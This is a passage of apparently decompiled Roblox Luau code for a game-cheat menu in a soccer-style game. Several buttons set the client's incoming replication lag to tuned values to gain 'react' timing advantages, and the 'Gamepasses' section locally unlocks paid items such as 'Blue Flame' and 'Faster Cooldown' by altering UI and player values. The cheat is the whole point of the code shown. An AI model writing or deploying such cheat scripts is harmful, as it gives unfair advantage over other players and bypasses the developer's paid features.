UIStroke_24.Thickness = 1;
UIStroke_24.Parent = Frame_46;
local TextBox_3 = Instance.new"TextBox";
TextBox_3.Size = UDim2_New(1, -16, 1, 0);
TextBox_3.Position = UDim2_New(0, 8, 0, 0);
TextBox_3.BackgroundTransparency = 1;
TextBox_3.PlaceholderText = "0";
TextBox_3.PlaceholderColor3 = R294_Result_7;
TextBox_3.Text = "";
TextBox_3.TextColor3 = R294_Result_6;
local _ = Enum.Font.Gotham;
TextBox_3.Font = Enum.Font.Gotham;
TextBox_3.TextSize = 10;
TextBox_3.ClearTextOnFocus = false;
local _ = Enum.TextXAlignment.Left;
TextBox_3.TextXAlignment = Enum.TextXAlignment.Left;
TextBox_3.Parent = Frame_46;
Frame_45.Size = UDim2_New(
    1,
    0,
    0,
    r1866 + 32
);
TextBox_3.Focused:Connect(function(a_54, b_54, c_54)
    TweenService:Create(UIStroke_24, r1036(0.2), {
        ["Color"] = R294_Result_5
    }):Play();
    r1040:Play();
end);
TextBox_3.FocusLost:Connect(function(enterPressed_1, a_55, b_55, c_55)
    TweenService:Create(UIStroke_24, r1036(0.2), {
        ["Color"] = R294_Result_4
    }):Play();
    r1040:Play();
    pcall(function(p1_56, a_56, b_56, c_56)
        tonumber(TextBox_3.Text);
    end);
end);
local Frame_47 = Instance.new"Frame";
Frame_47.BackgroundColor3 = FromRGB(27, 27, 27);
Frame_47.BorderSizePixel = 0;
Frame_47.BackgroundTransparency = 1;
Frame_47.LayoutOrder = 1;
Frame_47.Parent = Frame_42;
r1899 = Instance.new("UICorner", Frame_47);
r1899.CornerRadius = UDim_New(0, 8);
local UIPadding_14 = Instance.new"UIPadding";
UIPadding_14.PaddingTop = UDim_New(0, 10);
UIPadding_14.PaddingBottom = UDim_New(0, 10);
UIPadding_14.PaddingLeft = UDim_New(0, 10);
UIPadding_14.PaddingRight = UDim_New(0, 10);
UIPadding_14.Parent = Frame_47;
local Fields_Reacts = Instance.new"TextLabel";
Fields_Reacts.Size = UDim2_New(1, 0, 1, 0);
Fields_Reacts.BackgroundTransparency = 1;
Fields_Reacts.Text = "Fields Reacts";
Fields_Reacts.TextColor3 = R294_Result_6;
local _ = Enum.Font.Gotham;
Fields_Reacts.Font = Enum.Font.Gotham;
Fields_Reacts.TextSize = 13;
Fields_Reacts.TextTransparency = 0.2;
local _ = Enum.TextXAlignment.Left;
Fields_Reacts.TextXAlignment = Enum.TextXAlignment.Left;
local _ = Enum.TextYAlignment.Center;
Fields_Reacts.TextYAlignment = Enum.TextYAlignment.Center;
Fields_Reacts.Parent = Frame_47;
Frame_47.Size = UDim2_New(1, 0, 0, 21);
local TextButton_8 = Instance.new"TextButton";
TextButton_8.Size = UDim2_New(1, 0, 0, 32);
TextButton_8.BackgroundColor3 = FromRGB(27, 27, 27);
TextButton_8.AutoButtonColor = false;
TextButton_8.Text = "";
TextButton_8.ClipsDescendants = true;
TextButton_8.LayoutOrder = 2;
TextButton_8.Parent = Frame_42;
r1927 = Instance.new("UICorner", TextButton_8);
r1927.CornerRadius = UDim_New(0, 5);
local UIStroke_25 = Instance.new"UIStroke";
UIStroke_25.Color = R294_Result_4;
UIStroke_25.Parent = TextButton_8;
local Attacker_React = Instance.new"TextLabel";
Attacker_React.Size = UDim2_New(1, 0, 0, 32);
Attacker_React.Position = UDim2_New(0, 0, 0, 0);
Attacker_React.BackgroundTransparency = 1;
Attacker_React.Text = "Attacker React";
Attacker_React.TextColor3 = R294_Result_6;
Attacker_React.Font = Enum.Font.GothamBold;
Attacker_React.TextSize = 11;
local _ = Enum.TextXAlignment.Center;
Attacker_React.TextXAlignment = Enum.TextXAlignment.Center;
Attacker_React.Parent = TextButton_8;
TextButton_8.MouseButton1Click:Connect(function(a_57, b_57, c_57)
    TweenService:Create(TextButton_8, r1036(0.08), {
        ["Position"] = UDim2_New(0, 2, 0, 1.5),
        ["Size"] = UDim2_New(1, -4, 0, 29)
    }):Play();
    r1040:Play();
    task.wait(0.12);
    TweenService:Create(TextButton_8, r1036(0.15), {
        ["Position"] = UDim2_New(0, 0, 0, 0),
        ["Size"] = UDim2_New(1, 0, 0, 32)
    }):Play();
    r1040:Play();
    pcall(function(a_58, b_58, c_58)
        fenv.settings():GetService("NetworkSettings").IncomingReplicationLag = 0.09;
    end);
end);
local TextButton_9 = Instance.new"TextButton";
TextButton_9.Size = UDim2_New(1, 0, 0, 32);
TextButton_9.BackgroundColor3 = FromRGB(27, 27, 27);
TextButton_9.AutoButtonColor = false;
TextButton_9.Text = "";
TextButton_9.ClipsDescendants = true;
TextButton_9.LayoutOrder = 3;
TextButton_9.Parent = Frame_42;
r1946 = Instance.new("UICorner", TextButton_9);
r1946.CornerRadius = UDim_New(0, 5);
local UIStroke_26 = Instance.new"UIStroke";
UIStroke_26.Color = R294_Result_4;
UIStroke_26.Parent = TextButton_9;
local Midfield_React = Instance.new"TextLabel";
Midfield_React.Size = UDim2_New(1, 0, 0, 32);
Midfield_React.Position = UDim2_New(0, 0, 0, 0);
Midfield_React.BackgroundTransparency = 1;
Midfield_React.Text = "Midfield React";
Midfield_React.TextColor3 = R294_Result_6;
Midfield_React.Font = Enum.Font.GothamBold;
Midfield_React.TextSize = 11;
local _ = Enum.TextXAlignment.Center;
Midfield_React.TextXAlignment = Enum.TextXAlignment.Center;
Midfield_React.Parent = TextButton_9;
TextButton_9.MouseButton1Click:Connect(function(a_59, b_59, c_59)
    TweenService:Create(TextButton_9, r1036(0.08), {
        ["Position"] = UDim2_New(0, 2, 0, 1.5),
        ["Size"] = UDim2_New(1, -4, 0, 29)
    }):Play();
    r1040:Play();
    task.wait(0.12);
    TweenService:Create(TextButton_9, r1036(0.15), {
        ["Position"] = UDim2_New(0, 0, 0, 0),
        ["Size"] = UDim2_New(1, 0, 0, 32)
    }):Play();
    r1040:Play();
    pcall(function(a_60, b_60, c_60)
        fenv.settings():GetService("NetworkSettings").IncomingReplicationLag = 0.06;
    end);
end);
local TextButton_10 = Instance.new"TextButton";
TextButton_10.Size = UDim2_New(1, 0, 0, 32);
TextButton_10.BackgroundColor3 = FromRGB(27, 27, 27);
TextButton_10.AutoButtonColor = false;
TextButton_10.Text = "";
TextButton_10.ClipsDescendants = true;
TextButton_10.LayoutOrder = 4;
TextButton_10.Parent = Frame_42;
r1965 = Instance.new("UICorner", TextButton_10);
r1965.CornerRadius = UDim_New(0, 5);
local UIStroke_27 = Instance.new"UIStroke";
UIStroke_27.Color = R294_Result_4;
UIStroke_27.Parent = TextButton_10;
local GoalKepper_React = Instance.new"TextLabel";
GoalKepper_React.Size = UDim2_New(1, 0, 0, 32);
GoalKepper_React.Position = UDim2_New(0, 0, 0, 0);
GoalKepper_React.BackgroundTransparency = 1;
GoalKepper_React.Text = "GoalKepper React";
GoalKepper_React.TextColor3 = R294_Result_6;
GoalKepper_React.Font = Enum.Font.GothamBold;
GoalKepper_React.TextSize = 11;
local _ = Enum.TextXAlignment.Center;
GoalKepper_React.TextXAlignment = Enum.TextXAlignment.Center;
GoalKepper_React.Parent = TextButton_10;
TextButton_10.MouseButton1Click:Connect(function(a_61, b_61, c_61)
    TweenService:Create(TextButton_10, r1036(0.08), {
        ["Position"] = UDim2_New(0, 2, 0, 1.5),
        ["Size"] = UDim2_New(1, -4, 0, 29)
    }):Play();
    r1040:Play();
    task.wait(0.12);
    TweenService:Create(TextButton_10, r1036(0.15), {
        ["Position"] = UDim2_New(0, 0, 0, 0),
        ["Size"] = UDim2_New(1, 0, 0, 32)
    }):Play();
    r1040:Play();
    pcall(function(a_62, b_62, c_62)
        fenv.settings():GetService("NetworkSettings").IncomingReplicationLag = 0.023;
    end);
end);
local Frame_48 = Instance.new"Frame";
Frame_48.BackgroundColor3 = FromRGB(27, 27, 27);
Frame_48.BorderSizePixel = 0;
Frame_48.BackgroundTransparency = 1;
Frame_48.LayoutOrder = 5;
Frame_48.Parent = Frame_42;
r1982 = Instance.new("UICorner", Frame_48);
r1982.CornerRadius = UDim_New(0, 8);
local UIPadding_15 = Instance.new"UIPadding";
UIPadding_15.PaddingTop = UDim_New(0, 10);
UIPadding_15.PaddingBottom = UDim_New(0, 10);
UIPadding_15.PaddingLeft = UDim_New(0, 10);
UIPadding_15.PaddingRight = UDim_New(0, 10);
UIPadding_15.Parent = Frame_48;
local Players_Reacts = Instance.new"TextLabel";
Players_Reacts.Size = UDim2_New(1, 0, 1, 0);
Players_Reacts.BackgroundTransparency = 1;
Players_Reacts.Text = "Players Reacts";
Players_Reacts.TextColor3 = R294_Result_6;
local _ = Enum.Font.Gotham;
Players_Reacts.Font = Enum.Font.Gotham;
Players_Reacts.TextSize = 13;
Players_Reacts.TextTransparency = 0.2;
local _ = Enum.TextXAlignment.Left;
Players_Reacts.TextXAlignment = Enum.TextXAlignment.Left;
local _ = Enum.TextYAlignment.Center;
Players_Reacts.TextYAlignment = Enum.TextYAlignment.Center;
Players_Reacts.Parent = Frame_48;
Frame_48.Size = UDim2_New(1, 0, 0, 21);
local TextButton_11 = Instance.new"TextButton";
TextButton_11.Size = UDim2_New(1, 0, 0, 32);
TextButton_11.BackgroundColor3 = FromRGB(27, 27, 27);
TextButton_11.AutoButtonColor = false;
TextButton_11.Text = "";
TextButton_11.ClipsDescendants = true;
TextButton_11.LayoutOrder = 6;
TextButton_11.Parent = Frame_42;
r2010 = Instance.new("UICorner", TextButton_11);
r2010.CornerRadius = UDim_New(0, 5);
local UIStroke_28 = Instance.new"UIStroke";
UIStroke_28.Color = R294_Result_4;
UIStroke_28.Parent = TextButton_11;
local _97mzu_React = Instance.new"TextLabel";
_97mzu_React.Size = UDim2_New(1, 0, 0, 32);
_97mzu_React.Position = UDim2_New(0, 0, 0, 0);
_97mzu_React.BackgroundTransparency = 1;
_97mzu_React.Text = "97mzu React";
_97mzu_React.TextColor3 = R294_Result_6;
_97mzu_React.Font = Enum.Font.GothamBold;
_97mzu_React.TextSize = 11;
local _ = Enum.TextXAlignment.Center;
_97mzu_React.TextXAlignment = Enum.TextXAlignment.Center;
_97mzu_React.Parent = TextButton_11;
TextButton_11.MouseButton1Click:Connect(function(a_63, b_63, c_63)
    TweenService:Create(TextButton_11, r1036(0.08), {
        ["Position"] = UDim2_New(0, 2, 0, 1.5),
        ["Size"] = UDim2_New(1, -4, 0, 29)
    }):Play();
    r1040:Play();
    task.wait(0.12);
    TweenService:Create(TextButton_11, r1036(0.15), {
        ["Position"] = UDim2_New(0, 0, 0, 0),
        ["Size"] = UDim2_New(1, 0, 0, 32)
    }):Play();
    r1040:Play();
    pcall(function(a_64, b_64, c_64)
        fenv.settings():GetService("NetworkSettings").IncomingReplicationLag = 0.032;
    end);
end);
local TextButton_12 = Instance.new"TextButton";
TextButton_12.Size = UDim2_New(1, 0, 0, 32);
TextButton_12.BackgroundColor3 = FromRGB(27, 27, 27);
TextButton_12.AutoButtonColor = false;
TextButton_12.Text = "";
TextButton_12.ClipsDescendants = true;
TextButton_12.LayoutOrder = 7;
TextButton_12.Parent = Frame_42;
r2029 = Instance.new("UICorner", TextButton_12);
r2029.CornerRadius = UDim_New(0, 5);
local UIStroke_29 = Instance.new"UIStroke";
UIStroke_29.Color = R294_Result_4;
UIStroke_29.Parent = TextButton_12;
local Keel_React = Instance.new"TextLabel";
Keel_React.Size = UDim2_New(1, 0, 0, 32);
Keel_React.Position = UDim2_New(0, 0, 0, 0);
Keel_React.BackgroundTransparency = 1;
Keel_React.Text = "Keel React";
Keel_React.TextColor3 = R294_Result_6;
Keel_React.Font = Enum.Font.GothamBold;
Keel_React.TextSize = 11;
local _ = Enum.TextXAlignment.Center;
Keel_React.TextXAlignment = Enum.TextXAlignment.Center;
Keel_React.Parent = TextButton_12;
TextButton_12.MouseButton1Click:Connect(function(a_65, b_65, c_65)
    TweenService:Create(TextButton_12, r1036(0.08), {
        ["Position"] = UDim2_New(0, 2, 0, 1.5),
        ["Size"] = UDim2_New(1, -4, 0, 29)
    }):Play();
    r1040:Play();
    task.wait(0.12);
    TweenService:Create(TextButton_12, r1036(0.15), {
        ["Position"] = UDim2_New(0, 0, 0, 0),
        ["Size"] = UDim2_New(1, 0, 0, 32)
    }):Play();
    r1040:Play();
    pcall(function(a_66, b_66, c_66)
        fenv.settings():GetService("NetworkSettings").IncomingReplicationLag = 0.015;
    end);
end);
local TextButton_13 = Instance.new"TextButton";
TextButton_13.Size = UDim2_New(1, 0, 0, 32);
TextButton_13.BackgroundColor3 = FromRGB(27, 27, 27);
TextButton_13.AutoButtonColor = false;
TextButton_13.Text = "";
TextButton_13.ClipsDescendants = true;
TextButton_13.LayoutOrder = 8;
TextButton_13.Parent = Frame_42;
r2048 = Instance.new("UICorner", TextButton_13);
r2048.CornerRadius = UDim_New(0, 5);
local UIStroke_30 = Instance.new"UIStroke";
UIStroke_30.Color = R294_Result_4;
UIStroke_30.Parent = TextButton_13;
local Wazy_React = Instance.new"TextLabel";
Wazy_React.Size = UDim2_New(1, 0, 0, 32);
Wazy_React.Position = UDim2_New(0, 0, 0, 0);
Wazy_React.BackgroundTransparency = 1;
Wazy_React.Text = "Wazy React";
Wazy_React.TextColor3 = R294_Result_6;
Wazy_React.Font = Enum.Font.GothamBold;
Wazy_React.TextSize = 11;
local _ = Enum.TextXAlignment.Center;
Wazy_React.TextXAlignment = Enum.TextXAlignment.Center;
Wazy_React.Parent = TextButton_13;
TextButton_13.MouseButton1Click:Connect(function(a_67, b_67, c_67)
    TweenService:Create(TextButton_13, r1036(0.08), {
        ["Position"] = UDim2_New(0, 2, 0, 1.5),
        ["Size"] = UDim2_New(1, -4, 0, 29)
    }):Play();
    r1040:Play();
    task.wait(0.12);
    TweenService:Create(TextButton_13, r1036(0.15), {
        ["Position"] = UDim2_New(0, 0, 0, 0),
        ["Size"] = UDim2_New(1, 0, 0, 32)
    }):Play();
    r1040:Play();
    pcall(function(a_68, b_68, c_68)
        fenv.settings():GetService("NetworkSettings").IncomingReplicationLag = 0.03;
    end);
end);
local TextButton_14 = Instance.new"TextButton";
TextButton_14.Size = UDim2_New(1, 0, 0, 32);
TextButton_14.BackgroundColor3 = FromRGB(27, 27, 27);
TextButton_14.AutoButtonColor = false;
TextButton_14.Text = "";
TextButton_14.ClipsDescendants = true;
TextButton_14.LayoutOrder = 9;
TextButton_14.Parent = Frame_42;
r2067 = Instance.new("UICorner", TextButton_14);
r2067.CornerRadius = UDim_New(0, 5);
local UIStroke_31 = Instance.new"UIStroke";
UIStroke_31.Color = R294_Result_4;
UIStroke_31.Parent = TextButton_14;
local Darimax_React = Instance.new"TextLabel";
Darimax_React.Size = UDim2_New(1, 0, 0, 32);
Darimax_React.Position = UDim2_New(0, 0, 0, 0);
Darimax_React.BackgroundTransparency = 1;
Darimax_React.Text = "Darimax React";
Darimax_React.TextColor3 = R294_Result_6;
Darimax_React.Font = Enum.Font.GothamBold;
Darimax_React.TextSize = 11;
local _ = Enum.TextXAlignment.Center;
Darimax_React.TextXAlignment = Enum.TextXAlignment.Center;
Darimax_React.Parent = TextButton_14;
TextButton_14.MouseButton1Click:Connect(function(a_69, b_69, c_69)
    TweenService:Create(TextButton_14, r1036(0.08), {
        ["Position"] = UDim2_New(0, 2, 0, 1.5),
        ["Size"] = UDim2_New(1, -4, 0, 29)
    }):Play();
    r1040:Play();
    task.wait(0.12);
    TweenService:Create(TextButton_14, r1036(0.15), {
        ["Position"] = UDim2_New(0, 0, 0, 0),
        ["Size"] = UDim2_New(1, 0, 0, 32)
    }):Play();
    r1040:Play();
    pcall(function(a_70, b_70, c_70)
        fenv.settings():GetService("NetworkSettings").IncomingReplicationLag = 0.012;
    end);
end);
local Frame_49 = Instance.new"Frame";
Frame_49.BackgroundColor3 = FromRGB(27, 27, 27);
Frame_49.BorderSizePixel = 0;
Frame_49.BackgroundTransparency = 1;
Frame_49.LayoutOrder = 10;
Frame_49.Parent = Frame_42;
r2084 = Instance.new("UICorner", Frame_49);
r2084.CornerRadius = UDim_New(0, 8);
local UIPadding_16 = Instance.new"UIPadding";
UIPadding_16.PaddingTop = UDim_New(0, 10);
UIPadding_16.PaddingBottom = UDim_New(0, 10);
UIPadding_16.PaddingLeft = UDim_New(0, 10);
UIPadding_16.PaddingRight = UDim_New(0, 10);
UIPadding_16.Parent = Frame_49;
local TextLabel_7 = Instance.new"TextLabel";
TextLabel_7.Size = UDim2_New(1, 0, 1, 0);
TextLabel_7.BackgroundTransparency = 1;
TextLabel_7.Text = "This just increases the ping to a \nperfect delay setting react";
TextLabel_7.TextColor3 = R294_Result_6;
local _ = Enum.Font.Gotham;
TextLabel_7.Font = Enum.Font.Gotham;
TextLabel_7.TextSize = 13;
TextLabel_7.TextTransparency = 0.2;
local _ = Enum.TextXAlignment.Left;
TextLabel_7.TextXAlignment = Enum.TextXAlignment.Left;
local _ = Enum.TextYAlignment.Center;
TextLabel_7.TextYAlignment = Enum.TextYAlignment.Center;
TextLabel_7.Parent = Frame_49;
Frame_49.Size = UDim2_New(1, 0, 0, 21);
local TextButton_15 = Instance.new"TextButton";
TextButton_15.Size = UDim2_New(1, 0, 0, 40);
TextButton_15.BackgroundTransparency = 1;
TextButton_15.Text = "";
TextButton_15.AutoButtonColor = false;
TextButton_15.Parent = ScrollingFrame;
local Frame_50 = Instance.new"Frame";
Frame_50.Size = UDim2_New(0, 3, 0, 22);
Frame_50.Position = UDim2_New(0, 0, 0.5, -11);
Frame_50.BackgroundColor3 = R294_Result_5;
Frame_50.BackgroundTransparency = 1;
Frame_50.Parent = TextButton_15;
r2115 = Instance.new("UICorner", Frame_50);
r2115.CornerRadius = UDim_New(1, 0);
local Gamepasses = Instance.new"TextLabel";
Gamepasses.Size = UDim2_New(1, -12, 0, 18);
Gamepasses.Position = UDim2_New(0, 12, 0, 4);
Gamepasses.BackgroundTransparency = 1;
Gamepasses.Text = "Gamepasses";
Gamepasses.TextColor3 = R294_Result_7;
local _ = Enum.Font.GothamBold;
Gamepasses.Font = Enum.Font.GothamBold;
Gamepasses.TextSize = 11;
local _ = Enum.TextXAlignment.Left;
Gamepasses.TextXAlignment = Enum.TextXAlignment.Left;
Gamepasses.Parent = TextButton_15;
local Free_Gamepasses = Instance.new"TextLabel";
Free_Gamepasses.Size = UDim2_New(1, -12, 0, 14);
Free_Gamepasses.Position = UDim2_New(0, 12, 0, 21);
Free_Gamepasses.BackgroundTransparency = 1;
Free_Gamepasses.Text = "Free, Gamepasses...";
Free_Gamepasses.TextColor3 = R294_Result_7;
local _ = Enum.Font.Gotham;
Free_Gamepasses.Font = Enum.Font.Gotham;
Free_Gamepasses.TextSize = 11;
local _ = Enum.TextXAlignment.Left;
Free_Gamepasses.TextXAlignment = Enum.TextXAlignment.Left;
Free_Gamepasses.Parent = TextButton_15;
local Frame_51 = Instance.new"Frame";
Frame_51.Size = UDim2_New(1, 0, 1, 0);
Frame_51.BackgroundTransparency = 1;
Frame_51.Visible = false;
Frame_51.Parent = Frame_3;
local ScrollingFrame_11 = Instance.new"ScrollingFrame";
ScrollingFrame_11.Size = UDim2_New(0.5, -8, 1, -10);
ScrollingFrame_11.Position = UDim2_New(0, 6, 0, 5);
ScrollingFrame_11.BackgroundTransparency = 1;
ScrollingFrame_11.ScrollBarThickness = 1;
ScrollingFrame_11.ScrollBarImageColor3 = R294_Result_5;
ScrollingFrame_11.CanvasSize = UDim2_New(0, 0, 0, 0);
local _ = Enum.AutomaticSize.Y;
ScrollingFrame_11.AutomaticCanvasSize = Enum.AutomaticSize.Y;
ScrollingFrame_11.Parent = Frame_51;
local UIListLayout_19 = Instance.new"UIListLayout";
UIListLayout_19.Padding = UDim_New(0, 8);
local _ = Enum.SortOrder.LayoutOrder;
UIListLayout_19.SortOrder = Enum.SortOrder.LayoutOrder;
UIListLayout_19.Parent = ScrollingFrame_11;
local ScrollingFrame_12 = Instance.new"ScrollingFrame";
ScrollingFrame_12.Size = UDim2_New(0.5, -8, 1, -10);
ScrollingFrame_12.Position = UDim2_New(0.5, 2, 0, 5);
ScrollingFrame_12.BackgroundTransparency = 1;
ScrollingFrame_12.ScrollBarThickness = 1;
ScrollingFrame_12.ScrollBarImageColor3 = R294_Result_5;
ScrollingFrame_12.CanvasSize = UDim2_New(0, 0, 0, 0);
local _ = Enum.AutomaticSize.Y;
ScrollingFrame_12.AutomaticCanvasSize = Enum.AutomaticSize.Y;
ScrollingFrame_12.Parent = Frame_51;
local UIListLayout_20 = Instance.new"UIListLayout";
UIListLayout_20.Padding = UDim_New(0, 8);
local _ = Enum.SortOrder.LayoutOrder;
UIListLayout_20.SortOrder = Enum.SortOrder.LayoutOrder;
UIListLayout_20.Parent = ScrollingFrame_12;
TextButton_15.MouseButton1Click:Connect(function(a_71, b_71, c_71)
    local _ = TextButton_7 == TextButton_15;
    TweenService:Create(Frame_37, r1036(0.2), {
        ["BackgroundTransparency"] = 1
    }):Play();
    r1040:Play();
    TweenService:Create(Reach_And_Reacts, r1036(0.2), {
        ["TextColor3"] = R294_Result_7
    }):Play();
    r1040:Play();
    Frame_38.Visible = false;
    TweenService:Create(Frame_50, r1036(0.2), {
        ["BackgroundTransparency"] = 0
    }):Play();
    r1040:Play();
    TweenService:Create(Gamepasses, r1036(0.2), {
        ["TextColor3"] = R294_Result_6
    }):Play();
    r1040:Play();
    Frame_51.Visible = true;
end);
local Frame_52 = Instance.new"Frame";
Frame_52.Size = UDim2_New(1, 0, 0, 30);
Frame_52.BackgroundColor3 = R294_Result_3;
Frame_52.BorderSizePixel = 0;
ScrollingFrame_11:GetChildren();
Frame_52.LayoutOrder = 0;
Frame_52.Parent = ScrollingFrame_11;
r2175 = Instance.new("UICorner", Frame_52);
r2175.CornerRadius = UDim_New(0, 6);
local UIStroke_32 = Instance.new"UIStroke";
UIStroke_32.Color = R294_Result_4;
UIStroke_32.Parent = Frame_52;
local Gamepasses_2 = Instance.new"TextLabel";
Gamepasses_2.Size = UDim2_New(1, -16, 0, 26);
Gamepasses_2.Position = UDim2_New(0, 8, 0, 2);
Gamepasses_2.BackgroundTransparency = 1;
Gamepasses_2.Text = "Gamepasses";
Gamepasses_2.TextColor3 = R294_Result_6;
local _ = Enum.Font.GothamBold;
Gamepasses_2.Font = Enum.Font.GothamBold;
Gamepasses_2.TextSize = 13;
local _ = Enum.TextXAlignment.Left;
Gamepasses_2.TextXAlignment = Enum.TextXAlignment.Left;
Gamepasses_2.Parent = Frame_52;
local Frame_53 = Instance.new"Frame";
Frame_53.Size = UDim2_New(1, 0, 1, -28);
Frame_53.Position = UDim2_New(0, 0, 0, 28);
Frame_53.BackgroundTransparency = 1;
Frame_53.Parent = Frame_52;
local UIListLayout_21 = Instance.new"UIListLayout";
UIListLayout_21.Padding = UDim_New(0, 6);
local _ = Enum.SortOrder.LayoutOrder;
UIListLayout_21.SortOrder = Enum.SortOrder.LayoutOrder;
UIListLayout_21.Parent = Frame_53;
local UIPadding_17 = Instance.new"UIPadding";
UIPadding_17.PaddingLeft = UDim_New(0, 8);
UIPadding_17.PaddingRight = UDim_New(0, 8);
UIPadding_17.PaddingBottom = UDim_New(0, 8);
UIPadding_17.Parent = Frame_53;
UIListLayout_21:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function(a_72, b_72, c_72)
    Frame_52.Size = UDim2_New(
        1,
        0,
        0,
        UIListLayout_21.AbsoluteContentSize.Y + 36
    );
end);
game:GetService("Players");
CharacterAdded:Connect(function(a_73, b_73, c_73) end);
local TextButton_16 = Instance.new"TextButton";
TextButton_16.Size = UDim2_New(1, 0, 0, 26);
TextButton_16.BackgroundTransparency = 1;
TextButton_16.Text = "";
TextButton_16.AutoButtonColor = false;
TextButton_16.LayoutOrder = 1;
TextButton_16.Parent = Frame_53;
local Frame_54 = Instance.new"Frame";
Frame_54.Size = UDim2_New(0, 16, 0, 16);
Frame_54.Position = UDim2_New(0, 0, 0.5, -8);
Frame_54.BackgroundColor3 = FromRGB(23, 23, 23);
Frame_54.Parent = TextButton_16;
r2225 = Instance.new("UICorner", Frame_54);
r2225.CornerRadius = UDim_New(0, 4);
local ImageLabel_13 = Instance.new"ImageLabel";
ImageLabel_13.Size = UDim2_New(0, 10, 0, 10);
ImageLabel_13.Position = UDim2_New(0.5, -5, 0.5, -5);
ImageLabel_13.BackgroundTransparency = 1;
ImageLabel_13.Image = "rbxassetid://83827110621355";
ImageLabel_13.ImageColor3 = FromRGB(35, 35, 35);
ImageLabel_13.ImageTransparency = 1;
ImageLabel_13.Parent = Frame_54;
local Blue_Flame = Instance.new"TextLabel";
Blue_Flame.Size = UDim2_New(1, -26, 1, 0);
Blue_Flame.Position = UDim2_New(0, 20, 0, 0);
Blue_Flame.BackgroundTransparency = 1;
Blue_Flame.Text = "Blue Flame";
Blue_Flame.TextColor3 = R294_Result_6;
Blue_Flame.Font = Enum.Font.GothamBold;
Blue_Flame.TextSize = 13;
Blue_Flame.TextTransparency = 0.2;
local _ = Enum.TextXAlignment.Left;
Blue_Flame.TextXAlignment = Enum.TextXAlignment.Left;
local _ = Enum.TextYAlignment.Center;
Blue_Flame.TextYAlignment = Enum.TextYAlignment.Center;
Blue_Flame.Parent = TextButton_16;
TextButton_16.MouseButton1Click:Connect(function(a_73, b_73, c_73)
    TweenService:Create(Frame_54, r1036(0.15), {
        ["BackgroundColor3"] = R294_Result_5
    }):Play();
    r1040:Play();
    TweenService:Create(ImageLabel_13, r1036(0), {
        ["ImageTransparency"] = 0
    }):Play();
    r1040:Play();
    pcall(function(p1_74, a_74, b_74, c_74)
        BlueFlame = Start_2.GamePassMenu.Items.BlueFlame;
        BlueFlame.Tick.Visible = true;
        BlueFlame.BlueFlame.Style = "RobloxRoundButton";
        Start_2.PowerShot.Image = "rbxassetid://0";
        Backpack = LocalPlayer.Backpack;
        Backpack.FValue.Value = 2;
    end);
end);
local TextButton_17 = Instance.new"TextButton";
TextButton_17.Size = UDim2_New(1, 0, 0, 26);
TextButton_17.BackgroundTransparency = 1;
TextButton_17.Text = "";
TextButton_17.AutoButtonColor = false;
TextButton_17.LayoutOrder = 2;
TextButton_17.Parent = Frame_53;
local Frame_55 = Instance.new"Frame";
Frame_55.Size = UDim2_New(0, 16, 0, 16);
Frame_55.Position = UDim2_New(0, 0, 0.5, -8);
Frame_55.BackgroundColor3 = FromRGB(23, 23, 23);
Frame_55.Parent = TextButton_17;
r2257 = Instance.new("UICorner", Frame_55);
r2257.CornerRadius = UDim_New(0, 4);
local ImageLabel_14 = Instance.new"ImageLabel";
ImageLabel_14.Size = UDim2_New(0, 10, 0, 10);
ImageLabel_14.Position = UDim2_New(0.5, -5, 0.5, -5);
ImageLabel_14.BackgroundTransparency = 1;
ImageLabel_14.Image = "rbxassetid://83827110621355";
ImageLabel_14.ImageColor3 = FromRGB(35, 35, 35);
ImageLabel_14.ImageTransparency = 1;
ImageLabel_14.Parent = Frame_55;
local Faster_Cooldown = Instance.new"TextLabel";
Faster_Cooldown.Size = UDim2_New(1, -26, 1, 0);
Faster_Cooldown.Position = UDim2_New(0, 20, 0, 0);
Faster_Cooldown.BackgroundTransparency = 1;
Faster_Cooldown.Text = "Faster Cooldown";
Faster_Cooldown.TextColor3 = R294_Result_6;
Faster_Cooldown.Font = Enum.Font.GothamBold;
Faster_Cooldown.TextSize = 13;
Faster_Cooldown.TextTransparency = 0.2;
local _ = Enum.TextXAlignment.Left;
Faster_Cooldown.TextXAlignment = Enum.TextXAlignment.Left;
local _ = Enum.TextYAlignment.Center;
Faster_Cooldown.TextYAlignment = Enum.TextYAlignment.Center;
Faster_Cooldown.Parent = TextButton_17;
TextButton_17.MouseButton1Click:Connect(function(a_75, b_75, c_75)
    TweenService:Create(Frame_55, r1036(0.15), {
        ["BackgroundColor3"] = R294_Result_5
    }):Play();
    r1040:Play();
    TweenService:Create(ImageLabel_14, r1036(0), {
        ["ImageTransparency"] = 0
    }):Play();
    r1040:Play();
    pcall(function(p1_76, a_76, b_76, c_76)
        PowerShot = Start_2.PowerShot;
        PowerShot.PowerValue.Value = 29;
        Cooldown = Start_2.GamePassMenu.Items.Cooldown;
        Cooldown.Cooldown.Style = "RobloxRoundButton";
        Cooldown_2 = Start_2.GamePassMenu.Items.Cooldown;
        Cooldown_2.Tick.Visible = true;
    end);
end);
local TextButton_18 = Instance.new"TextButton";
TextButton_18.Size = UDim2_New(1, 0, 0, 40);
TextButton_18.BackgroundTransparency = 1;
TextButton_18.Text = "";
TextButton_18.AutoButtonColor = false;
TextButton_18.Parent = ScrollingFrame;
local Frame_56 = Instance.new"Frame";
Frame_56.Size = UDim2_New(0, 3, 0, 22);
Frame_56.Position = UDim2_New(0, 0, 0.5, -11);
Frame_56.BackgroundColor3 = R294_Result_5;
Frame_56.BackgroundTransparency = 1;
Frame_56.Parent = TextButton_18;
r2287 = Instance.new("UICorner", Frame_56);
r2287.CornerRadius = UDim_New(1, 0);
local Miscellaneous = Instance.new"TextLabel";
Miscellaneous.Size = UDim2_New(1, -12, 0, 18);
Miscellaneous.Position = UDim2_New(0, 12, 0, 4);
Miscellaneous.BackgroundTransparency = 1;
Miscellaneous.Text = "Miscellaneous";
Miscellaneous.TextColor3 = R294_Result_7;
local _ = Enum.Font.GothamBold;
Miscellaneous.Font = Enum.Font.GothamBold;
Miscellaneous.TextSize = 11;
local _ = Enum.TextXAlignment.Left;
Miscellaneous.TextXAlignment = Enum.TextXAlignment.Left;
Miscellaneous.Parent = TextButton_18;
local Many_Things = Instance.new"TextLabel";
Many_Things.Size = UDim2_New(1, -12, 0, 14);
Many_Things.Position = UDim2_New(0, 12, 0, 21);
Many_Things.BackgroundTransparency = 1;
Many_Things.Text = "Many things...";
Many_Things.TextColor3 = R294_Result_7;
local _ = Enum.Font.Gotham;
Many_Things.Font = Enum.Font.Gotham;
Many_Things.TextSize = 11;
